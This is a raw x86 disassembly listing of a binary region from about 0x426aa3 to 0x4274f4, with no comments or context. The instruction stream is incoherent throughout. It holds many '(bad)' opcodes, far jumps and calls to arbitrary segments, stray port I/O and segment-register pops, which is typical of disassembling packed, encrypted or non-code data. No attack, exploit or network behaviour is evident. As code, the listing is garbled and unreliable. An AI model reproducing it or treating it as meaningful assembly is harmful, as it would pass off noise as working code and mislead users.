  426aa3:	xor    dh,BYTE PTR [ebx+0x3555626b]
  426aa9:	test   al,0x8f
  426aab:	mov    ebx,0xdc1b2ce0
  426ab0:	mov    eax,0x22be59e8
  426ab5:	clc    
  426ab6:	sbb    al,0xa6
  426ab8:	js     0x426ac7
  426aba:	sbb    eax,0xe727ea40
  426abf:	pop    esi
  426ac0:	jne    0x426b35
  426ac2:	sbb    DWORD PTR [edx+ebx*1],ebp
  426ac5:	cmp    cl,cl
  426ac7:	clc    
  426ac8:	pop    ss
  426ac9:	fidiv  DWORD PTR [edi-0x6779b00]
  426acf:	jp     0x426a85
  426ad1:	jge    0x426b12
  426ad3:	and    DWORD PTR [esi-0x1debe986],edi
  426ad9:	imul   esp,ebp,0x8f922510
  426adf:	or     BYTE PTR [ebp+0x2d],ah
  426ae2:	pop    edx
  426ae3:	fisubr DWORD PTR [ebx+0x63]
  426ae6:	clc    
  426ae7:	and    al,bh
  426ae9:	push   edi
  426aea:	fist   DWORD PTR [ecx+0xe7]
	...
  426b54:	add    BYTE PTR [eax],al
  426b56:	cdq    
  426b57:	sub    BYTE PTR ds:0xdb77bd56,cl
  426b5d:	out    dx,eax
  426b5e:	inc    esi
  426b5f:	sub    DWORD PTR [esi],edi
  426b61:	or     al,0x8
  426b63:	call   0x9ee1f103
  426b68:	add    DWORD PTR [eax],eax
  426b6a:	inc    DWORD PTR [eax]
  426b6c:	add    BYTE PTR [eax],al
  426b6e:	mov    eax,ds:0x7631199b
  426b73:	push   edi
  426b74:	pusha  
  426b75:	jns    0x426b8f
  426b77:	pop    ebx
  426b78:	cmp    dh,BYTE PTR [eax]
  426b7a:	inc    esp
  426b7b:	sub    ebx,DWORD PTR [ebp+eiz*4+0x71]
  426b7f:	jae    0x426be0
  426b81:	jp     0x426bf3
  426b83:	sbb    dl,BYTE PTR [edx+0x36bed97a]
  426b89:	mov    al,0x56
  426b8b:	mov    al,ds:0x190a2b0e
  426b90:	mov    ds:0x168c8720,al
  426b95:	pop    ds
  426b96:	xchg   ebp,eax
  426b97:	fdivr  DWORD PTR [ecx+0x61109f9d]
  426b9d:	push   ecx
  426b9e:	test   al,0xea
  426ba0:	in     eax,dx
  426ba1:	push   ecx
  426ba2:	pop    esi
  426ba3:	add    ecx,DWORD PTR [edi]
  426ba5:	daa    
  426ba6:	xor    al,cl
  426ba8:	imul   edx,DWORD PTR [eax+0x1dd01d4],0x274c89b6
  426bb2:	pop    ebx
  426bb3:	mov    eax,ds:0x3cebbd49
  426bb8:	clc    
  426bb9:	and    ch,bl
  426bbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426bbc:	inc    esi
  426bbd:	xor    eax,0x61377072
  426bc2:	xchg   DWORD PTR [eax],eax
  426bc4:	sbb    DWORD PTR [edi+eiz*1-0x7e],edx
  426bc8:	and    DWORD PTR [edx-0x2c],esp
  426bcb:	repz sbb eax,0xd0959bd2
  426bd1:	popa   
  426bd2:	xor    ch,BYTE PTR ds:0xb33ed987
  426bd8:	loope  0x426bfe
  426bda:	out    dx,al
  426bdb:	popa   
  426bdc:	pop    edi
  426bdd:	(bad)  
  426bde:	sbb    edi,DWORD PTR [esi]
  426be0:	retf   0x76a4
  426be3:	in     eax,0xce
  426be5:	pop    ebx
  426be6:	jns    0x426b70
  426be8:	sbb    ebp,ebp
  426bea:	nop
  426beb:	cmp    BYTE PTR [edx],cl
  426bed:	arpl   WORD PTR [edi-0x2c],dx
  426bf0:	jp     0x426bbd
  426bf2:	push   edi
  426bf3:	jmp    0x4841767
  426bf8:	mov    al,ds:0xa0b87d8b
  426bfd:	push   edx
  426bfe:	jmp    0x8e5e:0x9c414188
  426c05:	jns    0x426bae
  426c07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426c08:	push   ebp
  426c09:	fist   WORD PTR [ebp-0x469b46a5]
  426c0f:	in     al,dx
  426c10:	out    dx,eax
  426c11:	jne    0x426c6d
  426c13:	test   DWORD PTR [esi+0x2a],esp
  426c16:	daa    
  426c17:	dec    ebp
  426c18:	mov    ah,0xe4
  426c1a:	adc    DWORD PTR [edi],0xc88e046c
  426c20:	iret   
  426c21:	adc    BYTE PTR [ecx+0xc84894a],0x41
  426c28:	lds    ecx,FWORD PTR [ecx]
  426c2a:	stc    
  426c2b:	mov    cs,WORD PTR [edx]
  426c2d:	retf   
  426c2e:	sub    dl,BYTE PTR [esi-0x9]
  426c31:	(bad)  [ebp+eax*2+0x1]
  426c35:	daa    
  426c36:	test   BYTE PTR [ecx-0xbd8ca86],dl
  426c3c:	add    BYTE PTR [ebp-0x7f],al
  426c3f:	sub    eax,DWORD PTR [edx]
  426c41:	dec    eax
  426c42:	out    dx,eax
  426c43:	imul   ebp,DWORD PTR [ebx+eax*1+0x10],0x35
  426c48:	data16 sub ah,BYTE PTR [eax+0x77]
  426c4c:	outs   dx,DWORD PTR ds:[esi]
  426c4d:	or     eax,0xe654005d
  426c52:	push   cs
  426c53:	int3   
  426c54:	fwait
  426c55:	sti    
  426c56:	pop    ds
  426c57:	ja     0x426c50
  426c59:	lock add edi,DWORD PTR [edx+0x64491420]
  426c60:	mov    edx,0xcf77fd51
  426c65:	repz pop esi
  426c67:	lock jp 0x426c98
  426c6a:	out    dx,al
  426c6b:	in     al,dx
  426c6c:	lods   eax,DWORD PTR ds:[esi]
	...
  426cd5:	add    dl,ah
  426cd7:	pusha  
  426cd8:	test   DWORD PTR [esi+0x74f3f787],esi
  426cde:	mov    ah,0xeb
  426ce0:	cld    
  426ce1:	mov    edx,0xfcf2e5f
  426ce6:	sahf   
  426ce7:	lahf   
  426ce8:	add    DWORD PTR [eax],eax
  426cea:	inc    DWORD PTR [eax]
  426cec:	add    BYTE PTR [eax],al
  426cee:	dec    esi
  426cef:	cmova  esp,DWORD PTR [edx]
  426cf2:	call   0x4b13d011
  426cf7:	push   eax
  426cf8:	or     al,BYTE PTR [esi]
  426cfa:	sbb    al,0xe4
  426cfc:	mov    al,ds:0x2ab1e320
  426d01:	dec    eax
  426d02:	test   al,0x75
  426d04:	gs in  al,0xde
  426d07:	mov    eax,0x22946b85
  426d0c:	xor    al,0x45
  426d0e:	pop    eax
  426d0f:	lods   eax,DWORD PTR ds:[esi]
  426d10:	inc    esp
  426d11:	push   ss
  426d12:	or     cl,0xa3
  426d15:	jge    0x426d5c
  426d17:	loop   0x426d2b
  426d19:	sar    DWORD PTR [eax-0x3f],1
  426d1c:	or     edx,edx
  426d1e:	out    dx,eax
  426d1f:	inc    ecx
  426d20:	scas   eax,DWORD PTR es:[edi]
  426d21:	call   0x29aa:0x808cfaa0
  426d28:	enter  0x8180,0x89
  426d2c:	pop    ds
  426d2d:	push   0x19169794
  426d32:	push   esp
  426d33:	pop    ds
  426d34:	mov    ebp,0x983b2bff
  426d39:	push   eax
  426d3a:	dec    eax
  426d3b:	lods   al,BYTE PTR ds:[esi]
  426d3c:	call   0xd2d3:0x85ff9448
  426d43:	mov    ch,0x7
  426d45:	adc    dl,BYTE PTR [edx+0x41faaad2]
  426d4b:	(bad)  
  426d4c:	bound  eax,QWORD PTR [eax+ebx*8]
  426d4f:	gs cmp edi,esi
  426d52:	jp     0x426d22
  426d54:	das    
  426d55:	and    esi,eax
  426d57:	test   al,0x61
  426d59:	out    dx,eax
  426d5a:	test   BYTE PTR [edi],0x7c
  426d5d:	and    al,BYTE PTR [edi+0x70]
  426d60:	in     eax,0xb
  426d62:	mov    dl,0xb1
  426d64:	jne    0x426dca
  426d66:	or     DWORD PTR [ebp+edx*1-0x6c],esp
  426d6a:	pop    ebx
  426d6b:	repz push edx
  426d6d:	dec    ebx
  426d6e:	stos   BYTE PTR es:[edi],al
  426d6f:	jno    0x426dd7
  426d71:	pop    esi
  426d72:	es ret 0x17f8
  426d76:	jae    0x426d60
  426d78:	jnp    0x426d76
  426d7a:	adc    ah,BYTE PTR [edi+edi*2]
  426d7d:	imul   ebx,DWORD PTR [eax+0x467fdb4e],0xffffff9b
  426d84:	push   0xffffffa1
  426d86:	bswap  edx
  426d88:	push   ecx
  426d89:	pshufw mm2,QWORD PTR [esi],0xae
  426d8d:	push   es
  426d8e:	pop    esi
  426d8f:	pop    esi
  426d90:	mov    dl,0x2f
  426d92:	pop    ebp
  426d93:	mov    bh,0x36
  426d95:	cld    
  426d96:	call   0x62ea7e1a
  426d9b:	and    DWORD PTR ds:0x40c7a961,edx
  426da1:	out    dx,al
  426da2:	mov    eax,ds:0x1865cc90
  426da7:	xchg   edi,eax
  426da8:	lods   al,BYTE PTR ds:[esi]
  426da9:	hlt    
  426daa:	mov    dl,0x67
  426dac:	enter  0x74ca,0x1f
  426db0:	inc    esi
  426db1:	or     eax,0x7ee3045c
  426db6:	jae    0x426da9
  426db8:	test   BYTE PTR [edi-0x1c],bh
  426dbb:	(bad)  
  426dbd:	mov    bl,0xe3
  426dbf:	jp     0x426d58
  426dc1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426dc2:	cmp    eax,0x8b94ae8e
  426dc7:	mov    dl,0xe4
  426dc9:	inc    esp
  426dca:	rol    BYTE PTR [esi-0x26f0ccdc],0x9
  426dd1:	push   edi
  426dd2:	pusha  
  426dd3:	cmp    cl,al
  426dd5:	adc    esp,ebx
  426dd7:	hlt    
  426dd8:	lods   eax,DWORD PTR ds:[esi]
  426dd9:	jb     0x426e18
  426ddb:	mov    esi,0x903a8840
  426de0:	scas   al,BYTE PTR es:[edi]
  426de1:	rcr    DWORD PTR [ecx-0x17d0281b],0x53
  426de8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426de9:	stc    
  426dea:	popf   
  426deb:	mov    eax,DWORD PTR [eax+eax*1+0x0]
	...
  426e53:	add    BYTE PTR [eax],al
  426e55:	add    BYTE PTR [edx],cl
  426e57:	mov    cl,0x61
  426e59:	repz sti 
  426e5b:	repz call 0xce0c:0xc7c2ecf9
  426e63:	dec    edx
  426e64:	int    0x2c
  426e66:	popf   
  426e67:	mov    al,ds:0xff0001
  426e6c:	add    BYTE PTR [eax],al
  426e6e:	test   eax,0x55ebdab3
  426e73:	stos   DWORD PTR es:[edi],eax
  426e74:	xor    edx,DWORD PTR [ecx-0x35a39d7c]
  426e7a:	cdq    
  426e7b:	xchg   esp,eax
  426e7c:	les    ebp,FWORD PTR [bp+di-0x18]
  426e80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426e81:	pushf  
  426e82:	int    0x63
  426e84:	repnz dec BYTE PTR [eax]
  426e87:	and    eax,0xd9a6c9d7
  426e8c:	dec    eax
  426e8d:	rol    edi,0x5
  426e90:	ret    
  426e91:	dec    edi
  426e92:	jne    0x426efa
  426e94:	out    0x31,eax
  426e96:	lds    eax,FWORD PTR gs:[edx]
  426e99:	mov    ds:0xe91f2eca,eax
  426e9e:	das    
  426e9f:	ret    0x22ed
  426ea2:	push   0xaf1c9bbc
  426ea7:	pop    ss
  426ea8:	sbb    eax,0xb962f8ab
  426ead:	std    
  426eae:	mov    bh,0xc7
  426eb0:	adc    al,0x48
  426eb2:	loop   0x426e8f
  426eb4:	xor    al,BYTE PTR ds:[ebp+0x61]
  426eb8:	pop    ebp
  426eb9:	aad    0x39
  426ebb:	(bad)  
  426ebc:	xchg   edi,eax
  426ebd:	push   ss
  426ebe:	fdiv   QWORD PTR [ecx]
  426ec0:	cmp    DWORD PTR [ecx],ebx
  426ec2:	stc    
  426ec3:	cmp    al,0xab
  426ec5:	daa    
  426ec6:	adc    esi,DWORD PTR [ebx]
  426ec8:	lods   eax,DWORD PTR ds:[esi]
  426ec9:	sbb    esi,DWORD PTR ds:0x554c8119
  426ecf:	(bad)  
  426ed0:	mov    ah,0xf5
  426ed2:	cli    
  426ed3:	mov    cl,0xcc
  426ed5:	inc    edi
  426ed6:	sti    
  426ed7:	arpl   WORD PTR cs:[ebx],dx
  426eda:	idiv   BYTE PTR ds:[eax]
  426edd:	out    0x17,al
  426edf:	cld    
  426ee0:	mov    edx,DWORD PTR ds:0xc564831c
  426ee6:	mov    ?,edi
  426ee8:	fdiv   QWORD PTR [edi-0x7e]
  426eeb:	mov    al,dh
  426eed:	ficom  DWORD PTR [esi]
  426eef:	sbb    DWORD PTR [edx-0x3f],esi
  426ef2:	in     eax,dx
  426ef3:	xchg   esi,eax
  426ef4:	(bad)  
  426ef6:	xchg   BYTE PTR [ebx-0x5ed39ebc],al
  426efc:	iret   
  426efd:	fisttp DWORD PTR [edx+0x36]
  426f00:	xchg   ebp,eax
  426f01:	call   0xf000:0x54cbeee3
  426f08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426f09:	pop    edi
  426f0a:	sbb    DWORD PTR [edi],edx
  426f0c:	add    al,0xb2
  426f0e:	popf   
  426f0f:	enter  0xae62,0xc4
  426f13:	ds inc esp
  426f15:	sar    DWORD PTR [ebx-0x39],cl
  426f18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426f19:	jnp    0x426efe
  426f1b:	adc    DWORD PTR [eax-0x226a2d34],0x4d
  426f22:	sbb    ebp,edi
  426f24:	idiv   DWORD PTR [eax-0x56]
  426f27:	and    DWORD PTR [ebp+0x9044169],0xffffffbd
  426f2e:	cld    
  426f2f:	mov    BYTE PTR [edi-0x17],ah
  426f32:	inc    esp
  426f33:	cli    
  426f34:	mov    ds:0xd47ee2ad,eax
  426f39:	stos   DWORD PTR es:[edi],eax
  426f3a:	or     eax,0x574bcdff
  426f3f:	pop    ecx
  426f40:	leave  
  426f41:	sub    bl,BYTE PTR [ecx+ebx*1-0x30]
  426f45:	mov    DWORD PTR [esi+0x6e],ebp
  426f48:	scas   eax,DWORD PTR es:[edi]
  426f49:	xchg   edi,eax
  426f4a:	inc    ecx
  426f4b:	xor    eax,0x73dc3631
  426f50:	or     eax,0xaf3fd667
  426f55:	das    
  426f56:	aaa    
  426f57:	mov    eax,ds:0xd4e90afd
  426f5c:	jae    0x426fd4
  426f5e:	imul   ebp,DWORD PTR [edi+edx*2+0x54792b68],0x49
  426f66:	and    DWORD PTR [edx+0x7c],0xe6aa6bf4
	...
  426fd5:	add    BYTE PTR [edx+eiz*4-0xa380e39],ah
  426fdc:	mov    dh,0xf7
  426fde:	inc    edi
  426fdf:	inc    ecx
  426fe0:	add    DWORD PTR [ebp+esi*4-0x63d07a01],esp
  426fe7:	mov    eax,ds:0xff0001
  426fec:	add    BYTE PTR [eax],al
  426fee:	lods   eax,DWORD PTR ds:[esi]
  426fef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426ff0:	xchg   edx,eax
  426ff1:	scas   al,BYTE PTR es:[edi]
  426ff2:	ret    
  426ff3:	es pop ebx
  426ff5:	mov    ds:0x2b866f68,al
  426ffa:	outs   dx,DWORD PTR ds:[esi]
  426ffb:	jl     0x426fd1
  426ffd:	rcl    ecx,cl
  426fff:	inc    ebp
  427000:	cmp    al,0xa4
  427002:	pop    ss
  427003:	push   eax
  427004:	loop   0x426fac
  427006:	scas   al,BYTE PTR es:[edi]
  427007:	push   ebx
  427008:	mov    cl,0xef
  42700a:	test   ah,0x50
  42700d:	pop    ebx
  42700e:	inc    esp
  42700f:	push   esp
  427010:	cmp    BYTE PTR [ecx+0x4241798f],dl
  427016:	and    edx,DWORD PTR [edi]
  427018:	adc    BYTE PTR [eax-0x587b49dd],dh
  42701e:	jnp    0x42703c
  427020:	cmp    esp,DWORD PTR [edx-0x6b0c46e8]
  427026:	retf   0xd64
  427029:	das    
  42702a:	cmp    al,0x1b
  42702c:	mov    dl,0xa8
  42702e:	jno    0x426fdd
  427030:	(bad)  
  427031:	fisubr WORD PTR [edi+0x4861b9e7]
  427037:	pop    ss
  427038:	(bad)  
  427039:	(bad)  
  42703a:	push   esi
  42703b:	mov    ch,0xb
  42703d:	js     0x427046
  42703f:	jl     0x426fd7
  427041:	icebp  
  427042:	in     eax,dx
  427043:	aam    0x65
  427045:	leave  
  427046:	sbb    BYTE PTR [edx-0x123b99b7],al
  42704c:	dec    esi
  42704d:	ds retf 
  42704f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427050:	mov    bh,0x29
  427052:	push   ss
  427053:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427054:	sub    ebx,ebp
  427056:	adc    BYTE PTR [ebp-0x22],dl
  427059:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42705a:	add    al,0x63
  42705c:	xor    eax,0x75fa0fa1
  427061:	aad    0x1c
  427063:	or     al,0x7b
  427065:	xor    DWORD PTR [ebx+0x58],esp
  427068:	out    0xe1,al
  42706a:	loope  0x42704f
  42706c:	lea    esi,[ebp*1-0x27ec68e2]
  427073:	push   ebx
  427074:	adc    bl,ch
  427076:	push   cs
  427077:	sar    DWORD PTR [esi+0x469dd074],1
  42707d:	scas   eax,DWORD PTR es:[edi]
  42707e:	nop
  42707f:	test   ebp,ecx
  427081:	push   ss
  427082:	add    dh,BYTE PTR [edx+0x19]
  427085:	push   esp
  427086:	dec    esi
  427087:	in     al,dx
  427088:	xchg   edx,eax
  427089:	mov    esi,0x1c46c629
  42708e:	add    esi,ebp
  427090:	stc    
  427091:	aaa    
  427092:	adc    ecx,ebp
  427094:	int3   
  427095:	pop    edx
  427096:	sub    dl,cl
  427098:	xor    eax,0x760ceaa8
  42709d:	ret    
  42709e:	or     DWORD PTR [edi],esi
  4270a0:	mov    ecx,0x7980dd6c
  4270a5:	out    dx,al
  4270a6:	rol    DWORD PTR [bx+di+0x29f],0xea
  4270ac:	ret    
  4270ad:	iret   
  4270ae:	add    al,0x1d
  4270b0:	mov    ch,0x6f
  4270b2:	pop    ebp
  4270b3:	fs or  al,0x3b
  4270b6:	daa    
  4270b7:	ds aas 
  4270b9:	jne    0x4270c1
  4270bb:	stos   DWORD PTR es:[edi],eax
  4270bc:	push   esp
  4270bd:	push   ebp
  4270be:	sub    eax,ebp
  4270c0:	pop    esi
  4270c1:	sub    DWORD PTR [edx+0x36],0xffffffb4
  4270c5:	pushf  
  4270c6:	dec    eax
  4270c7:	outs   dx,DWORD PTR ds:[esi]
  4270c8:	sub    BYTE PTR [ecx],ch
  4270ca:	inc    ebp
  4270cb:	cmp    al,0xb8
  4270cd:	test   eax,0xa0626801
  4270d2:	add    bl,BYTE PTR [ebx+0x60bd8c19]
  4270d8:	or     al,0x69
  4270da:	adc    DWORD PTR [esi+0x52c8132e],esi
  4270e0:	add    eax,0x6ada0ccb
  4270e5:	pop    ebx
  4270e6:	loopne 0x4270f0
  4270e8:	jnp    0x42707c
  4270ea:	in     eax,dx
  4270eb:	xchg   ebp,eax
  4270ec:	lahf   
	...
  427155:	add    BYTE PTR [ebp*2-0x8846ae6],cl
  42715c:	(bad)  
  42715d:	std    
  42715e:	inc    esp
  42715f:	mov    ebp,0x97fb9d96
  427164:	xor    esp,esi
  427166:	fwait
  427167:	mov    ds:0xff0001,al
  42716c:	add    BYTE PTR [eax],al
  42716e:	mov    cl,0x77
  427170:	jo     0x4271dc
  427172:	pop    es
  427173:	js     0x4271f0
  427175:	mov    bl,0x79
  427177:	sub    dl,dl
  427179:	in     eax,0xcb
  42717b:	or     al,0x37
  42717d:	pop    ds
  42717e:	add    eax,0x5ba8fa44
  427183:	dec    ecx
  427184:	imul   esp,edx,0xe8bd4597
  42718a:	(bad)  
  42718c:	(bad)  
  42718d:	pop    eax
  42718e:	xchg   ebx,eax
  42718f:	xor    eax,0xf527a40b
  427194:	(bad)  
  427195:	mov    esi,0x8154fcda
  42719a:	mov    BYTE PTR [eax+ebx*8],bl
  42719d:	mov    esp,0x32c7955
  4271a2:	loopne 0x42721d
  4271a4:	jle    0x4271c6
  4271a6:	adc    ebx,DWORD PTR [esi+0x16]
  4271a9:	retf   
  4271aa:	dec    esp
  4271ab:	or     DWORD PTR [eax-0x156dbccc],esp
  4271b1:	mov    ebp,0xef1e9bfd
  4271b6:	mov    eax,ds:0xb5b13c3f
  4271bb:	sbb    eax,DWORD PTR [ebp+0xd]
  4271be:	pop    esi
  4271bf:	push   esp
  4271c0:	xor    al,0xce
  4271c2:	cmc    
  4271c3:	push   edx
  4271c4:	loop   0x427235
  4271c6:	xor    BYTE PTR [esi+0x3bcd5a29],cl
  4271cc:	stos   DWORD PTR es:[edi],eax
  4271cd:	pusha  
  4271ce:	loopne 0x427237
  4271d0:	mov    gs,WORD PTR [esi]
  4271d2:	jg     0x42716e
  4271d4:	(bad)  
  4271d5:	xor    bh,BYTE PTR [ebx-0x5d8cfbd2]
  4271db:	clc    
  4271dc:	enter  0x99f2,0x91
  4271e0:	push   eax
  4271e1:	pminsw mm6,QWORD PTR [edi+0x31e02f4f]
  4271e8:	arpl   WORD PTR [edx-0x46ee06fd],dx
  4271ee:	popf   
  4271ef:	or     DWORD PTR [eax+0x34],ebx
  4271f2:	outs   dx,DWORD PTR ds:[esi]
  4271f3:	push   es
  4271f4:	sbb    ch,dh
  4271f6:	out    dx,al
  4271f7:	xchg   ebp,eax
  4271f8:	jns    0x427258
  4271fa:	jge    0x427205
  4271fc:	pushf  
  4271fd:	mov    ss,WORD PTR [edi-0x493d5be3]
  427203:	pop    es
  427204:	jge    0x427198
  427206:	push   ebx
  427207:	popa   
  427208:	cmp    al,0x3d
  42720a:	jp     0x4271bd
  42720c:	outs   dx,DWORD PTR ds:[esi]
  42720d:	aas    
  42720e:	push   eax
  42720f:	sahf   
  427210:	js     0x4271ce
  427212:	cld    
  427213:	dec    esp
  427214:	out    0xc4,al
  427216:	cs xchg esi,eax
  427218:	jbe    0x4271b9
  42721a:	pop    edi
  42721b:	sub    DWORD PTR [esi-0x5b],ecx
  42721e:	xor    al,BYTE PTR [eax]
  427220:	cdq    
  427221:	jno    0x4271ae
  427223:	lea    esi,[edx]
  427225:	test   BYTE PTR [ebp-0x19],bh
  427228:	dec    edx
  427229:	nop
  42722a:	sub    eax,DWORD PTR [edx-0x4fdd18b]
  427230:	outs   dx,DWORD PTR ds:[esi]
  427231:	sub    al,0xec
  427233:	cmp    bl,dh
  427235:	mov    WORD PTR [ebx-0x8],?
  427238:	test   al,0x51
  42723a:	adc    BYTE PTR [esi-0x32a284ab],bh
  427240:	inc    edi
  427241:	or     edx,ebp
  427243:	xchg   DWORD PTR [esi],edx
  427245:	ret    
  427246:	and    dl,BYTE PTR [edx]
  427248:	out    0x37,al
  42724a:	out    dx,al
  42724b:	ss or  esp,edx
  42724e:	mov    esi,0x5da76aa9
  427253:	fild   WORD PTR [esi-0x20]
  427256:	adc    ch,BYTE PTR [edi]
  427258:	mov    al,0x4a
  42725a:	nop
  42725b:	ss xchg ecx,eax
  42725d:	aam    0x5b
  42725f:	out    dx,eax
  427260:	pop    esp
  427261:	stos   DWORD PTR es:[edi],eax
  427262:	pop    edi
  427263:	call   0xeada32b6
  427268:	mov    ebx,0xebd1596c
	...
  4272d5:	add    BYTE PTR [esi],bl
  4272d7:	inc    ecx
  4272d8:	fdiv   QWORD PTR [edi+ebx*8-0x7e148143]
  4272df:	push   ecx
  4272e0:	dec    ebp
  4272e1:	mov    ds:0xc27bd953,al
  4272e6:	call   0x0:0xff0001a3
  4272ed:	add    BYTE PTR ds:0x5764596d,bl
  4272f3:	jns    0x427362
  4272f5:	cmc    
  4272f6:	mov    dh,0x33
  4272f8:	sbb    cl,BYTE PTR [edx-0x2]
  4272fb:	cdq    
  4272fc:	cli    
  4272fd:	js     0x427352
  4272ff:	sbb    al,cl
  427301:	xchg   ecx,eax
  427302:	imul   ebp,DWORD PTR [edi],0x5d
  427305:	cmp    cl,BYTE PTR [ebx]
  427307:	rcl    BYTE PTR [eax+0x2b],0x7b
  42730b:	push   esi
  42730c:	jmp    0xc8ac:0xb8b51c23
  427313:	jp     0x42730d
  427315:	(bad)  
  427317:	mov    ecx,0x240e68ed
  42731c:	or     al,0xf1
  42731e:	ins    DWORD PTR es:[edi],dx
  42731f:	jge    0x42734d
  427321:	adc    eax,0xaddad23d
  427326:	mov    ebp,ebp
  427328:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427329:	mov    al,0xf8
  42732b:	jno    0x4273a2
  42732d:	or     edx,ebx
  42732f:	call   0x57f:0x8546e6a
  427336:	mov    ah,0xc0
  427338:	lods   eax,DWORD PTR ds:[esi]
  427339:	mov    cl,0x8
  42733b:	loopne 0x4272e7
  42733d:	mov    ecx,0x4722cf42
  427342:	push   esi
  427343:	jno    0x427322
  427345:	push   ss
  427346:	and    bl,BYTE PTR [edx+0x7ba04970]
  42734c:	and    DWORD PTR [eax+0x5a],esp
  42734f:	call   0x44cbcb23
  427354:	jge    0x42739c
  427356:	pop    ebp
  427357:	push   ebp
  427358:	(bad)  
  427359:	fcomp  DWORD PTR [edx]
  42735b:	dec    edx
  42735c:	sub    al,0x9f
  42735e:	sar    ebx,cl
  427360:	push   edx
  427361:	arpl   WORD PTR [ecx-0x7cea0ad5],bx
  427367:	pop    ebx
  427368:	ret    
  427369:	int    0x3e
  42736b:	jg     0x4273d8
  42736d:	loopne 0x4273ca
  42736f:	(bad)  
  427370:	aam    0xa7
  427372:	xor    eax,0x620ca53a
  427377:	pop    ss
  427378:	cmp    al,0xc2
  42737a:	call   0xa2e0:0x622a4d99
  427381:	pop    ss
  427382:	lods   al,BYTE PTR ds:[esi]
  427383:	jle    0x4273a0
  427385:	cmp    ecx,DWORD PTR [ebx]
  427387:	jge    0x427345
  427389:	cmp    BYTE PTR [ebp+edi*2+0x6],0x3b
  42738e:	(bad)  
  42738f:	lods   eax,DWORD PTR ds:[esi]
  427390:	add    BYTE PTR [ecx+ebp*2],dh
  427393:	mov    fs,esi
  427395:	das    
  427396:	out    dx,eax
  427397:	mov    ebx,0x5d5a4559
  42739c:	cmc    
  42739d:	mov    ecx,0xac0796df
  4273a2:	test   DWORD PTR [ebx+0x54],0xbdb8d136
  4273a9:	xchg   esp,eax
  4273aa:	jne    0x427400
  4273ac:	pop    edx
  4273ad:	fsubr  DWORD PTR [ebx-0x479599ea]
  4273b3:	sub    BYTE PTR [ebp+0x35],bl
  4273b6:	jp     0x42739d
  4273b8:	jnp    0x427388
  4273ba:	ror    cl,cl
  4273bc:	inc    ebp
  4273bd:	cwde   
  4273be:	add    eax,0xf5f4d721
  4273c3:	adc    BYTE PTR [ecx],0x7c
  4273c6:	xchg   esi,eax
  4273c7:	retf   
  4273c8:	into   
  4273c9:	mov    eax,0x30323de0
  4273ce:	xchg   esi,eax
  4273cf:	xchg   ebp,eax
  4273d0:	and    al,0x64
  4273d2:	fs pusha 
  4273d4:	xchg   edi,eax
  4273d5:	arpl   WORD PTR [ebp-0x59],bx
  4273d8:	jmp    0x4273cc
  4273da:	xchg   DWORD PTR [edx],edx
  4273dc:	push   ebp
  4273dd:	xlat   BYTE PTR ds:[ebx]
  4273de:	xlat   BYTE PTR ds:[ebx]
  4273df:	adc    dh,BYTE PTR [esi+0x14620c32]
  4273e5:	dec    ebx
  4273e6:	ins    DWORD PTR es:[edi],dx
  4273e7:	lods   eax,DWORD PTR ds:[esi]
  4273e8:	cmp    DWORD PTR [ebx*1+0xad2d],esi
	...
  427453:	add    BYTE PTR [eax],al
  427455:	add    BYTE PTR [edx],dl
  427457:	sbb    eax,0xaf3f8832
  42745c:	mov    edx,0x29f0389f
  427461:	sbb    ebp,ebp
  427463:	fneni(8087 only) 
  427465:	mov    ebp,0x1a499
  42746a:	inc    DWORD PTR [eax]
  42746c:	add    BYTE PTR [eax],al
  42746e:	pop    ecx
  42746f:	inc    ecx
  427470:	xchg   esp,eax
  427471:	lea    ebx,[esi+edx*1]
  427474:	out    dx,al
  427475:	ins    DWORD PTR es:[edi],dx
  427476:	daa    
  427477:	xor    edi,DWORD PTR [ecx+0x51]
  42747a:	cmp    DWORD PTR [ecx+0x70],ebx
  42747d:	add    BYTE PTR [esi],bl
  42747f:	sub    cl,BYTE PTR [ebx]
  427481:	ins    BYTE PTR es:[edi],dx
  427482:	add    eax,0xc0070b42
  427487:	les    ebp,FWORD PTR [ecx-0x37]
  42748a:	(bad)  
  42748b:	retf   0x7cf4
  42748e:	mov    DWORD PTR [ebx+esi*8-0x303a21b7],esi
  427495:	cwde   
  427496:	inc    ebp
  427497:	nop
  427498:	adc    al,0x57
  42749a:	iret   
  42749b:	jp     0x4274ad
  42749d:	shr    BYTE PTR [esi-0x56adb713],cl
  4274a3:	out    dx,eax
  4274a4:	dec    edi
  4274a5:	stos   DWORD PTR es:[edi],eax
  4274a6:	add    BYTE PTR es:[eax-0xa5780ac],dh
  4274ad:	or     ah,BYTE PTR [edi+0x40]
  4274b0:	xchg   edx,eax
  4274b1:	mov    eax,ds:0x48171ae6
  4274b6:	dec    edi
  4274b7:	add    eax,0xbe40dd73
  4274bc:	xchg   esp,eax
  4274bd:	pop    eax
  4274be:	data16 fstp DWORD PTR [ebx-0x18f1d984]
  4274c5:	or     eax,0x38164b5d
  4274ca:	sub    BYTE PTR [esi+ebp*1],bh
  4274cd:	mov    ebp,0x9393937
  4274d2:	aam    0xb8
  4274d4:	dec    esi
  4274d5:	mov    cs,WORD PTR [ebx-0x328418b8]
  4274db:	xlat   BYTE PTR ds:[ebx]
  4274dc:	and    BYTE PTR [esi],cl
  4274de:	pop    edi
  4274df:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4274e1:	push   esp
  4274e2:	(bad)  
  4274e3:	xchg   edx,eax
  4274e4:	sbb    BYTE PTR [edx],ah
  4274e6:	mov    BYTE PTR [edi],dh
  4274e8:	or     edi,ebx
  4274ea:	fidivr WORD PTR [esi-0x11e29c71]
  4274f0:	jmp    0x427513
  4274f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4274f3:	cdq    
  4274f4:	sbb    BYTE PTR [ebx+0x31],dh
